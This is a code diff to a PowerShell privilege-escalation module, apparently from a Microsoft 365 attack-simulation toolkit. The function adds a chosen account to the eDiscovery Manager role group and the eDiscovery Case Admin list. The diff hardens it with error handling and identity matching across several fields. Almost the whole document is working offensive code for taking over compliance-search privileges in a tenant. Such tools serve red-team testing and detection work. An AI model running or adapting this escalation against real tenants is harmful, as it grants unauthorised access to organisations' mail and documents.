@@ -102,48 +102,104 @@ function E_Discovery_Downloader ($case_name, $export_name){
 function E_Discovery_Priv_Esc {
 
     EnterAccount "`n[?] Enter account to escalate privileges (user@org.com)"
+    if ($global:account_found -ne $true) {
+        MAADPause
+        return
+    }
     $target_account = $global:account_username
 
-    $role_members = Get-RoleGroupMember "eDiscovery Manager"
-    $admin_role_members = Get-eDiscoveryCaseAdmin
+    try {
+        $target_user = Get-EntraUser -UserId $target_account -ErrorAction Stop
+        $target_display_name = $target_user.DisplayName
+    }
+    catch {
+        MAADWriteError "Failed to resolve target user in Entra"
+        MAADWriteError (GetMAADExceptionMessage $_)
+        MAADPause
+        return
+    }
 
-    #Check eDiscovery Admin 
-    if ((Get-EntraUser -UserId $target_account).DisplayName -notin $admin_role_members.Name){
+    try {
+        $role_members = @(Get-RoleGroupMember "eDiscovery Manager" -ErrorAction Stop)
+    }
+    catch {
+        MAADWriteError "Failed to read 'eDiscovery Manager' role group members"
+        MAADWriteError (GetMAADExceptionMessage $_)
+        MAADWriteInfo "This module requires a full IPPSSession. A search-only compliance session does not expose role management cmdlets."
+        MAADWriteInfo "Re-establish Compliance access (Access menu -> 11) using an account licensed for Exchange role management."
+        MAADPause
+        return
+    }
 
-        ###Not eDiscovery Manager
-        if ((Get-EntraUser -UserId $target_account).DisplayName -notin $role_members.Name){ 
-            #Escalate to Manager
-            try {
-                MAADWriteProcess "Attempting privilege escalation -> eDiscovery Manager role" 
-                Add-RoleGroupMember -Identity "eDiscovery Manager" -Member $target_account -ErrorAction Stop | Out-Null
-                MAADWriteProcess "Role assigned to user"
-                MAADWriteProcess "Waiting for changes to take effect" 
-                Start-Sleep -Seconds 30
-                MAADWriteSuccess "Elevated Privileges to eDiscovery Manager"
-            }
-            catch {
-                MAADWriteError "Failed privilege escalation to eDiscovery Manager" 
+    try {
+        $admin_role_members = @(Get-eDiscoveryCaseAdmin -ErrorAction Stop)
+    }
+    catch {
+        MAADWriteError "Failed to read eDiscovery Case Admin list"
+        MAADWriteError (GetMAADExceptionMessage $_)
+        MAADPause
+        return
+    }
+
+    # Compare across multiple identifier fields since role members may expose Name/DisplayName/PrimarySmtpAddress/WindowsLiveID
+    $candidate_ids = @($target_display_name, $target_account) | Where-Object { $_ -notin $null, "" }
+    $is_admin = $false
+    foreach ($member in $admin_role_members) {
+        foreach ($field in @("Name","DisplayName","PrimarySmtpAddress","WindowsLiveID")) {
+            if ($member.PSObject.Properties.Name -contains $field -and $member.$field -in $candidate_ids) {
+                $is_admin = $true
                 break
             }
         }
-        
-        ###Escalate to eDiscovery Admin
+        if ($is_admin) { break }
+    }
+
+    if ($is_admin) {
+        MAADWriteProcess "Sometimes life isn't that hard ;)"
+        MAADWriteProcess "User is already eDiscovery Admin & eDiscovery Manager"
+        MAADPause
+        return
+    }
+
+    $is_manager = $false
+    foreach ($member in $role_members) {
+        foreach ($field in @("Name","DisplayName","PrimarySmtpAddress","WindowsLiveID")) {
+            if ($member.PSObject.Properties.Name -contains $field -and $member.$field -in $candidate_ids) {
+                $is_manager = $true
+                break
+            }
+        }
+        if ($is_manager) { break }
+    }
+
+    if (-not $is_manager) {
         try {
-            MAADWriteProcess "Attempting privilege escalation to eDiscovery Administrator role" 
-            Add-eDiscoveryCaseAdmin -User $target_account | Out-Null
+            MAADWriteProcess "Attempting privilege escalation -> eDiscovery Manager role"
+            Add-RoleGroupMember -Identity "eDiscovery Manager" -Member $target_account -ErrorAction Stop | Out-Null
             MAADWriteProcess "Role assigned to user"
-            MAADWriteProcess "Waiting for changes to take effect" 
+            MAADWriteProcess "Waiting for changes to take effect"
             Start-Sleep -Seconds 30
-            MAADWriteSuccess "Elevated Privileges to eDiscovery Admin"
+            MAADWriteSuccess "Elevated Privileges to eDiscovery Manager"
         }
         catch {
-            MAADWriteError "Failed privilege escalation to eDiscovery Admin" 
-            break
+            MAADWriteError "Failed privilege escalation to eDiscovery Manager"
+            MAADWriteError (GetMAADExceptionMessage $_)
+            MAADPause
+            return
         }
     }
-    else {
-        MAADWriteProcess "Sometimes life isn't that hard ;)" 
-        MAADWriteProcess "User is already eDiscovery Admin & eDiscovery Manager" 
+
+    try {
+        MAADWriteProcess "Attempting privilege escalation to eDiscovery Administrator role"
+        Add-eDiscoveryCaseAdmin -User $target_account -ErrorAction Stop | Out-Null
+        MAADWriteProcess "Role assigned to user"
+        MAADWriteProcess "Waiting for changes to take effect"
+        Start-Sleep -Seconds 30
+        MAADWriteSuccess "Elevated Privileges to eDiscovery Admin"
+    }
+    catch {
+        MAADWriteError "Failed privilege escalation to eDiscovery Admin"
+        MAADWriteError (GetMAADExceptionMessage $_)
     }
     MAADPause
 }
